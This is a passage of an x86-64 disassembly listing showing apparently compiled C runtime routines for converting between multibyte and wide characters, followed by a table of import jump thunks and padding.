   32c4880eb:	49 c7 c0 ff ff ff ff 	mov    $0xffffffffffffffff,%r8
   32c4880f2:	eb ce                	jmp    0x32c4880c2
   32c4880f4:	0f 1f 40 00          	nopl   0x0(%rax)
   32c4880f8:	4d 85 c0             	test   %r8,%r8
   32c4880fb:	74 bf                	je     0x32c4880bc
   32c4880fd:	41 c7 00 00 00 00 00 	movl   $0x0,(%r8)
   32c488104:	eb b6                	jmp    0x32c4880bc
   32c488106:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   32c48810d:	00 00 00 
   32c488110:	48 8d 44 24 5c       	lea    0x5c(%rsp),%rax
   32c488115:	45 31 c0             	xor    %r8d,%r8d
   32c488118:	4c 8d 5c 24 5a       	lea    0x5a(%rsp),%r11
   32c48811d:	31 d2                	xor    %edx,%edx
   32c48811f:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   32c488124:	8b 84 24 90 00 00 00 	mov    0x90(%rsp),%eax
   32c48812b:	41 b9 01 00 00 00    	mov    $0x1,%r9d
   32c488131:	66 44 89 44 24 5a    	mov    %r8w,0x5a(%rsp)
   32c488137:	4c 8d 44 24 78       	lea    0x78(%rsp),%r8
   32c48813c:	4c 89 54 24 70       	mov    %r10,0x70(%rsp)
   32c488141:	c7 44 24 5c 00 00 00 	movl   $0x0,0x5c(%rsp)
   32c488148:	00 
   32c488149:	48 c7 44 24 30 00 00 	movq   $0x0,0x30(%rsp)
   32c488150:	00 00 
   32c488152:	89 44 24 28          	mov    %eax,0x28(%rsp)
   32c488156:	4c 89 5c 24 20       	mov    %r11,0x20(%rsp)
   32c48815b:	4c 89 5c 24 40       	mov    %r11,0x40(%rsp)
   32c488160:	ff 15 b2 90 00 00    	call   *0x90b2(%rip)        # 0x32c491218
   32c488166:	85 c0                	test   %eax,%eax
   32c488168:	0f 84 72 ff ff ff    	je     0x32c4880e0
   32c48816e:	39 84 24 90 00 00 00 	cmp    %eax,0x90(%rsp)
   32c488175:	0f 8c 65 ff ff ff    	jl     0x32c4880e0
   32c48817b:	8b 54 24 5c          	mov    0x5c(%rsp),%edx
   32c48817f:	85 d2                	test   %edx,%edx
   32c488181:	0f 85 59 ff ff ff    	jne    0x32c4880e0
   32c488187:	48 8b 54 24 40       	mov    0x40(%rsp),%rdx
   32c48818c:	48 8b 4c 24 70       	mov    0x70(%rsp),%rcx
   32c488191:	4c 63 c0             	movslq %eax,%r8
   32c488194:	4c 89 44 24 48       	mov    %r8,0x48(%rsp)
   32c488199:	e8 02 03 00 00       	call   0x32c4884a0
   32c48819e:	4c 8b 44 24 48       	mov    0x48(%rsp),%r8
   32c4881a3:	e9 1a ff ff ff       	jmp    0x32c4880c2
   32c4881a8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   32c4881af:	00 
   32c4881b0:	e8 b3 02 00 00       	call   0x32c488468
   32c4881b5:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   32c4881bb:	e9 2b ff ff ff       	jmp    0x32c4880eb
   32c4881c0:	48 83 ec 48          	sub    $0x48,%rsp
   32c4881c4:	41 8b 01             	mov    (%r9),%eax
   32c4881c7:	49 89 cb             	mov    %rcx,%r11
   32c4881ca:	4d 89 ca             	mov    %r9,%r10
   32c4881cd:	48 85 d2             	test   %rdx,%rdx
   32c4881d0:	0f 84 ca 00 00 00    	je     0x32c4882a0
   32c4881d6:	3d ff 00 00 00       	cmp    $0xff,%eax
   32c4881db:	0f 87 07 01 00 00    	ja     0x32c4882e8
   32c4881e1:	4d 85 c0             	test   %r8,%r8
   32c4881e4:	0f 84 46 01 00 00    	je     0x32c488330
   32c4881ea:	89 44 24 3c          	mov    %eax,0x3c(%rsp)
   32c4881ee:	83 7c 24 78 01       	cmpl   $0x1,0x78(%rsp)
   32c4881f3:	0f 84 c7 01 00 00    	je     0x32c4883c0
   32c4881f9:	8b 4c 24 70          	mov    0x70(%rsp),%ecx
   32c4881fd:	85 c9                	test   %ecx,%ecx
   32c4881ff:	0f 84 3b 01 00 00    	je     0x32c488340
   32c488205:	0f b6 0a             	movzbl (%rdx),%ecx
   32c488208:	84 c0                	test   %al,%al
   32c48820a:	0f 85 80 01 00 00    	jne    0x32c488390
   32c488210:	83 7c 24 78 02       	cmpl   $0x2,0x78(%rsp)
   32c488215:	0f 84 c5 01 00 00    	je     0x32c4883e0
   32c48821b:	88 4c 24 3c          	mov    %cl,0x3c(%rsp)
   32c48821f:	41 b9 01 00 00 00    	mov    $0x1,%r9d
   32c488225:	c7 44 24 78 01 00 00 	movl   $0x1,0x78(%rsp)
   32c48822c:	00 
   32c48822d:	84 c9                	test   %cl,%cl
   32c48822f:	0f 84 fb 01 00 00    	je     0x32c488430
   32c488235:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   32c48823a:	4c 89 54 24 68       	mov    %r10,0x68(%rsp)
   32c48823f:	8b 4c 24 70          	mov    0x70(%rsp),%ecx
   32c488243:	4c 8d 44 24 3c       	lea    0x3c(%rsp),%r8
   32c488248:	66 89 44 24 3a       	mov    %ax,0x3a(%rsp)
   32c48824d:	48 8d 44 24 3a       	lea    0x3a(%rsp),%rax
   32c488252:	ba 08 00 00 00       	mov    $0x8,%edx
   32c488257:	4c 89 5c 24 50       	mov    %r11,0x50(%rsp)
   32c48825c:	c7 44 24 28 01 00 00 	movl   $0x1,0x28(%rsp)
   32c488263:	00 
   32c488264:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   32c488269:	ff 15 79 8f 00 00    	call   *0x8f79(%rip)        # 0x32c4911e8
   32c48826f:	83 f8 01             	cmp    $0x1,%eax
   32c488272:	75 62                	jne    0x32c4882d6
   32c488274:	4c 8b 5c 24 50       	mov    0x50(%rsp),%r11
   32c488279:	4c 8b 54 24 68       	mov    0x68(%rsp),%r10
   32c48827e:	4d 85 db             	test   %r11,%r11
   32c488281:	74 09                	je     0x32c48828c
   32c488283:	0f b7 44 24 3a       	movzwl 0x3a(%rsp),%eax
   32c488288:	66 41 89 03          	mov    %ax,(%r11)
   32c48828c:	41 c7 02 00 00 00 00 	movl   $0x0,(%r10)
   32c488293:	48 63 54 24 78       	movslq 0x78(%rsp),%rdx
   32c488298:	48 89 d0             	mov    %rdx,%rax
   32c48829b:	48 83 c4 48          	add    $0x48,%rsp
   32c48829f:	c3                   	ret
   32c4882a0:	3d ff 00 00 00       	cmp    $0xff,%eax
   32c4882a5:	77 41                	ja     0x32c4882e8
   32c4882a7:	89 44 24 3c          	mov    %eax,0x3c(%rsp)
   32c4882ab:	83 7c 24 78 01       	cmpl   $0x1,0x78(%rsp)
   32c4882b0:	0f 84 aa 00 00 00    	je     0x32c488360
   32c4882b6:	44 8b 4c 24 70       	mov    0x70(%rsp),%r9d
   32c4882bb:	31 d2                	xor    %edx,%edx
   32c4882bd:	45 85 c9             	test   %r9d,%r9d
   32c4882c0:	74 d6                	je     0x32c488298
   32c4882c2:	84 c0                	test   %al,%al
   32c4882c4:	74 42                	je     0x32c488308
   32c4882c6:	c6 44 24 3d 00       	movb   $0x0,0x3d(%rsp)
   32c4882cb:	80 7c 24 3c 00       	cmpb   $0x0,0x3c(%rsp)
   32c4882d0:	0f 84 a0 00 00 00    	je     0x32c488376
   32c4882d6:	e8 8d 01 00 00       	call   0x32c488468
   32c4882db:	c7 00 2a 00 00 00    	movl   $0x2a,(%rax)
   32c4882e1:	eb 10                	jmp    0x32c4882f3
   32c4882e3:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   32c4882e8:	e8 7b 01 00 00       	call   0x32c488468
   32c4882ed:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   32c4882f3:	48 c7 c2 ff ff ff ff 	mov    $0xffffffffffffffff,%rdx
   32c4882fa:	48 89 d0             	mov    %rdx,%rax
   32c4882fd:	48 83 c4 48          	add    $0x48,%rsp
   32c488301:	c3                   	ret
   32c488302:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   32c488308:	83 7c 24 78 02       	cmpl   $0x2,0x78(%rsp)
   32c48830d:	75 67                	jne    0x32c488376
   32c48830f:	31 c9                	xor    %ecx,%ecx
   32c488311:	4c 89 54 24 68       	mov    %r10,0x68(%rsp)
   32c488316:	e8 6d 01 00 00       	call   0x32c488488
   32c48831b:	4c 8b 54 24 68       	mov    0x68(%rsp),%r10
   32c488320:	85 c0                	test   %eax,%eax
   32c488322:	74 52                	je     0x32c488376
   32c488324:	c6 44 24 3c 00       	movb   $0x0,0x3c(%rsp)
   32c488329:	8b 44 24 3c          	mov    0x3c(%rsp),%eax
   32c48832d:	41 89 02             	mov    %eax,(%r10)
   32c488330:	48 c7 c2 fe ff ff ff 	mov    $0xfffffffffffffffe,%rdx
   32c488337:	48 89 d0             	mov    %rdx,%rax
   32c48833a:	48 83 c4 48          	add    $0x48,%rsp
   32c48833e:	c3                   	ret
   32c48833f:	90                   	nop
   32c488340:	0f b6 02             	movzbl (%rdx),%eax
   32c488343:	4d 85 db             	test   %r11,%r11
   32c488346:	74 07                	je     0x32c48834f
   32c488348:	0f b6 d0             	movzbl %al,%edx
   32c48834b:	66 41 89 13          	mov    %dx,(%r11)
   32c48834f:	31 d2                	xor    %edx,%edx
   32c488351:	84 c0                	test   %al,%al
   32c488353:	0f 95 c2             	setne  %dl
   32c488356:	48 89 d0             	mov    %rdx,%rax
   32c488359:	48 83 c4 48          	add    $0x48,%rsp
   32c48835d:	c3                   	ret
   32c48835e:	66 90                	xchg   %ax,%ax
   32c488360:	84 c0                	test   %al,%al
   32c488362:	0f 85 80 ff ff ff    	jne    0x32c4882e8
   32c488368:	44 8b 5c 24 70       	mov    0x70(%rsp),%r11d
   32c48836d:	45 85 db             	test   %r11d,%r11d
   32c488370:	0f 84 22 ff ff ff    	je     0x32c488298
   32c488376:	31 d2                	xor    %edx,%edx
   32c488378:	41 c7 02 00 00 00 00 	movl   $0x0,(%r10)
   32c48837f:	48 89 d0             	mov    %rdx,%rax
   32c488382:	48 83 c4 48          	add    $0x48,%rsp
   32c488386:	c3                   	ret
   32c488387:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   32c48838e:	00 00 
   32c488390:	88 4c 24 3d          	mov    %cl,0x3d(%rsp)
   32c488394:	80 7c 24 3c 00       	cmpb   $0x0,0x3c(%rsp)
   32c488399:	0f 84 91 00 00 00    	je     0x32c488430
   32c48839f:	c7 44 24 78 01 00 00 	movl   $0x1,0x78(%rsp)
   32c4883a6:	00 
   32c4883a7:	84 c9                	test   %cl,%cl
   32c4883a9:	0f 84 27 ff ff ff    	je     0x32c4882d6
   32c4883af:	41 b9 02 00 00 00    	mov    $0x2,%r9d
   32c4883b5:	e9 7b fe ff ff       	jmp    0x32c488235
   32c4883ba:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   32c4883c0:	84 c0                	test   %al,%al
   32c4883c2:	0f 85 20 ff ff ff    	jne    0x32c4882e8
   32c4883c8:	44 8b 44 24 70       	mov    0x70(%rsp),%r8d
   32c4883cd:	45 85 c0             	test   %r8d,%r8d
   32c4883d0:	0f 84 6a ff ff ff    	je     0x32c488340
   32c4883d6:	0f b6 0a             	movzbl (%rdx),%ecx
   32c4883d9:	e9 3d fe ff ff       	jmp    0x32c48821b
   32c4883de:	66 90                	xchg   %ax,%ax
   32c4883e0:	48 89 54 24 58       	mov    %rdx,0x58(%rsp)
   32c4883e5:	4c 89 5c 24 50       	mov    %r11,0x50(%rsp)
   32c4883ea:	4c 89 4c 24 68       	mov    %r9,0x68(%rsp)
   32c4883ef:	4c 89 44 24 60       	mov    %r8,0x60(%rsp)
   32c4883f4:	e8 8f 00 00 00       	call   0x32c488488
   32c4883f9:	48 8b 54 24 58       	mov    0x58(%rsp),%rdx
   32c4883fe:	4c 8b 5c 24 50       	mov    0x50(%rsp),%r11
   32c488403:	85 c0                	test   %eax,%eax
   32c488405:	4c 8b 54 24 68       	mov    0x68(%rsp),%r10
   32c48840a:	0f b6 02             	movzbl (%rdx),%eax
   32c48840d:	74 35                	je     0x32c488444
   32c48840f:	88 44 24 3c          	mov    %al,0x3c(%rsp)
   32c488413:	48 83 7c 24 60 01    	cmpq   $0x1,0x60(%rsp)
   32c488419:	0f 84 0a ff ff ff    	je     0x32c488329
   32c48841f:	0f b6 4a 01          	movzbl 0x1(%rdx),%ecx
   32c488423:	88 4c 24 3d          	mov    %cl,0x3d(%rsp)
   32c488427:	84 c0                	test   %al,%al
   32c488429:	0f 85 78 ff ff ff    	jne    0x32c4883a7
   32c48842f:	90                   	nop
   32c488430:	4d 85 db             	test   %r11,%r11
   32c488433:	0f 84 3d ff ff ff    	je     0x32c488376
   32c488439:	31 d2                	xor    %edx,%edx
   32c48843b:	66 41 89 13          	mov    %dx,(%r11)
   32c48843f:	e9 32 ff ff ff       	jmp    0x32c488376
   32c488444:	89 c1                	mov    %eax,%ecx
   32c488446:	e9 d0 fd ff ff       	jmp    0x32c48821b
   32c48844b:	90                   	nop
   32c48844c:	90                   	nop
   32c48844d:	90                   	nop
   32c48844e:	90                   	nop
   32c48844f:	90                   	nop
   32c488450:	ff 25 d2 8d 00 00    	jmp    *0x8dd2(%rip)        # 0x32c491228
   32c488456:	90                   	nop
   32c488457:	90                   	nop
   32c488458:	ff 25 d2 8d 00 00    	jmp    *0x8dd2(%rip)        # 0x32c491230
   32c48845e:	90                   	nop
   32c48845f:	90                   	nop
   32c488460:	ff 25 d2 8d 00 00    	jmp    *0x8dd2(%rip)        # 0x32c491238
   32c488466:	90                   	nop
   32c488467:	90                   	nop
   32c488468:	ff 25 da 8d 00 00    	jmp    *0x8dda(%rip)        # 0x32c491248
   32c48846e:	90                   	nop
   32c48846f:	90                   	nop
   32c488470:	ff 25 f2 8d 00 00    	jmp    *0x8df2(%rip)        # 0x32c491268
   32c488476:	90                   	nop
   32c488477:	90                   	nop
   32c488478:	ff 25 fa 8d 00 00    	jmp    *0x8dfa(%rip)        # 0x32c491278
   32c48847e:	90                   	nop
   32c48847f:	90                   	nop
   32c488480:	ff 25 fa 8d 00 00    	jmp    *0x8dfa(%rip)        # 0x32c491280
   32c488486:	90                   	nop
   32c488487:	90                   	nop
   32c488488:	ff 25 02 8e 00 00    	jmp    *0x8e02(%rip)        # 0x32c491290
   32c48848e:	90                   	nop
   32c48848f:	90                   	nop
   32c488490:	ff 25 02 8e 00 00    	jmp    *0x8e02(%rip)        # 0x32c491298
   32c488496:	90                   	nop
   32c488497:	90                   	nop
   32c488498:	ff 25 02 8e 00 00    	jmp    *0x8e02(%rip)        # 0x32c4912a0
   32c48849e:	90                   	nop
   32c48849f:	90                   	nop
   32c4884a0:	ff 25 02 8e 00 00    	jmp    *0x8e02(%rip)        # 0x32c4912a8
   32c4884a6:	90                   	nop
   32c4884a7:	90                   	nop
   32c4884a8:	ff 25 0a 8e 00 00    	jmp    *0x8e0a(%rip)        # 0x32c4912b8
   32c4884ae:	90                   	nop
   32c4884af:	90                   	nop
   32c4884b0:	ff 25 0a 8e 00 00    	jmp    *0x8e0a(%rip)        # 0x32c4912c0
   32c4884b6:	90                   	nop
   32c4884b7:	90                   	nop
   32c4884b8:	ff 25 0a 8e 00 00    	jmp    *0x8e0a(%rip)        # 0x32c4912c8
   32c4884be:	90                   	nop
   32c4884bf:	90                   	nop
   32c4884c0:	ff 25 12 8e 00 00    	jmp    *0x8e12(%rip)        # 0x32c4912d8
   32c4884c6:	90                   	nop
   32c4884c7:	90                   	nop
   32c4884c8:	ff 25 12 8e 00 00    	jmp    *0x8e12(%rip)        # 0x32c4912e0
   32c4884ce:	90                   	nop
   32c4884cf:	90                   	nop
   32c4884d0:	ff 25 42 8d 00 00    	jmp    *0x8d42(%rip)        # 0x32c491218
   32c4884d6:	90                   	nop
   32c4884d7:	90                   	nop
   32c4884d8:	ff 25 32 8d 00 00    	jmp    *0x8d32(%rip)        # 0x32c491210
   32c4884de:	90                   	nop
   32c4884df:	90                   	nop
   32c4884e0:	ff 25 22 8d 00 00    	jmp    *0x8d22(%rip)        # 0x32c491208
   32c4884e6:	90                   	nop
   32c4884e7:	90                   	nop
   32c4884e8:	ff 25 12 8d 00 00    	jmp    *0x8d12(%rip)        # 0x32c491200
   32c4884ee:	90                   	nop
   32c4884ef:	90                   	nop
   32c4884f0:	ff 25 02 8d 00 00    	jmp    *0x8d02(%rip)        # 0x32c4911f8
   32c4884f6:	90                   	nop
   32c4884f7:	90                   	nop
   32c4884f8:	ff 25 f2 8c 00 00    	jmp    *0x8cf2(%rip)        # 0x32c4911f0
   32c4884fe:	90                   	nop
   32c4884ff:	90                   	nop
   32c488500:	ff 25 e2 8c 00 00    	jmp    *0x8ce2(%rip)        # 0x32c4911e8
   32c488506:	90                   	nop
   32c488507:	90                   	nop
   32c488508:	ff 25 d2 8c 00 00    	jmp    *0x8cd2(%rip)        # 0x32c4911e0
   32c48850e:	90                   	nop
   32c48850f:	90                   	nop
   32c488510:	ff 25 c2 8c 00 00    	jmp    *0x8cc2(%rip)        # 0x32c4911d8
   32c488516:	90                   	nop
   32c488517:	90                   	nop
   32c488518:	ff 25 b2 8c 00 00    	jmp    *0x8cb2(%rip)        # 0x32c4911d0
   32c48851e:	90                   	nop
   32c48851f:	90                   	nop
   32c488520:	ff 25 a2 8c 00 00    	jmp    *0x8ca2(%rip)        # 0x32c4911c8
   32c488526:	90                   	nop
   32c488527:	90                   	nop
   32c488528:	ff 25 92 8c 00 00    	jmp    *0x8c92(%rip)        # 0x32c4911c0
   32c48852e:	90                   	nop
   32c48852f:	90                   	nop
   32c488530:	ff 25 82 8c 00 00    	jmp    *0x8c82(%rip)        # 0x32c4911b8
   32c488536:	90                   	nop
   32c488537:	90                   	nop
   32c488538:	ff 25 72 8c 00 00    	jmp    *0x8c72(%rip)        # 0x32c4911b0
   32c48853e:	90                   	nop
   32c48853f:	90                   	nop
   32c488540:	ff 25 62 8c 00 00    	jmp    *0x8c62(%rip)        # 0x32c4911a8
   32c488546:	90                   	nop
   32c488547:	90                   	nop
   32c488548:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   32c48854f:	00 
   32c488550:	e9 eb 8d ff ff       	jmp    0x32c481340
   32c488555:	90                   	nop
   32c488556:	90                   	nop
   32c488557:	90                   	nop
   32c488558:	90                   	nop
   32c488559:	90                   	nop
   32c48855a:	90                   	nop
   32c48855b:	90                   	nop
   32c48855c:	90                   	nop
   32c48855d:	90                   	nop
   32c48855e:	90                   	nop
   32c48855f:	90                   	nop
